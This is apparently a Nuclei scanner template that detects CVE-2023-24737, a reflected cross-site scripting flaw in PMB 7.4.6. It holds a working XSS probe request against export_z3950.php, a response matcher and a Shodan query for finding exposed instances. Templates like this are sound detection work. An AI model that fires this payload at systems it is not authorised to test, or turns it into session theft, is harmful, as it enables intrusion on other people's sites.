http:
- matchers:
  - part: body
    type: word
    words:
    - 3@1=<script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /pmb/admin/convert/export_z3950.php?command=search&query=%3Cscript%3Ealert(document.domain);%3C/script%3E=or
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-24737
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:pmb_project:pmb:7.4.6:*:*:*:*:*:*:*
    cve-id: CVE-2023-24737
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.29124
    epss-score: 0.00071
  description: 'PMB v7.4.6 allows an attacker to perform a reflected XSS on export_z3950.php
    via the ''query'' parameter.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 1
    product: pmb
    shodan-query: http.favicon.hash:1469328760
    vendor: pmb_project
    verified: true
  name: PMB v7.4.6 - Cross-Site Scripting
  reference:
  - https://github.com/AetherBlack/CVE/blob/main/PMB/readme.md
  - https://github.com/AetherBlack/CVE/tree/main/PMB
  - https://nvd.nist.gov/vuln/detail/CVE-2023-24737
  remediation: 'Apply the latest security patch or upgrade to a non-vulnerable version
    of PMB.

    '
  severity: medium
  tags: cve,cve2023,xss,pmb,pmb_project
